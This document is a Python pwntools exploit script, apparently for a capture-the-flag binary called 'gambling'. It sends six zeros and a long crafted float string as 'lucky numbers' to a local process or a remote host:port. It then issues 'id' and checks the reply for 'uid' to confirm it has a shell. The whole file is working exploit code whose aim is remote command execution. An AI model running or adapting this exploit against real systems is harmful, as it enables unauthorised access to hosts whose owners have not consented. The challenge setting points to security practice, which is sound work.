from pwn import *
import struct
import argparse

context.binary = './gambling'
context.arch = 'i386'
context.log_level = 'warn'

# Argument parsing
parser = argparse.ArgumentParser()
parser.add_argument('--host', type=str, help='Remote host')
parser.add_argument('--port', type=int, help='Remote port')
args = parser.parse_args()

# Exact float string to send
exact_float_str = "0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048678447653429606926762156265085299415604106647379534502196788585758286387045593904549590297537598720611109479754048472644682294918"

print("[+] Starting exploit...")

def start_process():
    if args.host and args.port:
        return remote(args.host, args.port)
    else:
        return process('./gambling')

if __name__ == "__main__":
    p = start_process()
    p.recvuntil(b'Enter your lucky numbers: ')

    # Build the payload with the exact float string as the 7th number
    payload = "0 0 0 0 0 0 " + exact_float_str
    print(f"[+] Sending payload: {payload}")
    p.sendline(payload.encode())

    p.sendline(b'id')
    print(p.recvline())
    result = p.recvline()
    if b'uid' in result:
        print("SUCCESS")
        print(result)
    p.close()